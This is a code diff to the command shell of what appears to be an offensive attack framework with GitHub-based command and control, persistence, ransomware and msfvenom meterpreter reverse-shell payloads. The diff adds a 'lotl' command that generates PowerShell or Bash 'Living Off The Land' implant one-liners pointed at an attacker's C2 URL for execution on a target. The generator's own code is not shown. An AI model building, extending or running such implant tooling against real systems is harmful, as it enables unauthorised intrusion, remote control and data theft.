@@ -38,6 +38,7 @@ from modules.github_c2 import GitHubC2
 from modules import persistence
 import qrcode
 from modules import ransomware
+from modules import lotl
 
 # --- Shell State ---
 github_c2_instance = None
@@ -71,7 +72,7 @@ def print_help():
     print("  persist           - Generate a persistence command")
     print("  qrcode            - Generate a QR code for payload delivery")
     print("  ransom            - Run a ransomware simulation")
-    print("  lotl-agent        - Start the LOTL C2 agent")
+    print("  lotl              - Generate a Living Off The Land implant")
     print("  ape-unleash       - Unleash the APE engine")
     print("  hare-unleash      - Unleash the HARE engine")
     print("  exit              - Exit the shell")
@@ -101,6 +102,14 @@ def print_generate_help():
     print("  linux         - linux/x86/meterpreter/reverse_tcp")
     print("  python        - python/meterpreter/reverse_tcp")
     print("  php           - php/meterpreter/reverse_tcp")
+
+def print_lotl_help():
+    """Prints the help menu for the lotl command."""
+    print("\n--- Living Off The Land (LOTL) Implant Generator ---")
+    print("Usage: lotl <os> <c2_url>")
+    print("\nSupported OS:")
+    print("  windows       - Generates a PowerShell one-liner")
+    print("  linux         - Generates a Bash one-liner")
 
 def print_ransom_help():
     """Prints the help menu for the ransom command."""
@@ -276,6 +285,26 @@ def run_generate_command(args):
         print("Error: msfvenom is not installed or not in your PATH. Please install Metasploit Framework.")
     except subprocess.CalledProcessError as e:
         print(f"Error generating payload: {e}")
+
+def run_lotl_command(args):
+    """Handles the lotl command and its subcommands."""
+    if len(args) != 2:
+        print_lotl_help()
+        return
+
+    os_type, c2_url = args
+
+    if os_type.lower() == "windows":
+        oneliner = lotl.generate_powershell_oneliner(c2_url)
+        print("\n--- Windows PowerShell LOTL Implant (copy and execute on target) ---")
+        print(oneliner)
+    elif os_type.lower() == "linux":
+        oneliner = lotl.generate_bash_oneliner(c2_url)
+        print("\n--- Linux Bash LOTL Implant (copy and execute on target) ---")
+        print(oneliner)
+    else:
+        print(f"Error: Unsupported OS '{os_type}'.")
+        print_lotl_help()
 
 def run_ransom_command(args):
     """Handles the ransom command and its subcommands."""
@@ -628,9 +657,8 @@ def process_command(cmd_line):
         run_qrcode_command(args)
     elif command == "ransom":
         run_ransom_command(args)
-    elif command == "lotl-agent":
-        # ... (lotl-agent logic)
-        pass
+    elif command == "lotl":
+        run_lotl_command(args)
     elif command == "ape-unleash":
         # ... (ape-unleash logic)
         pass
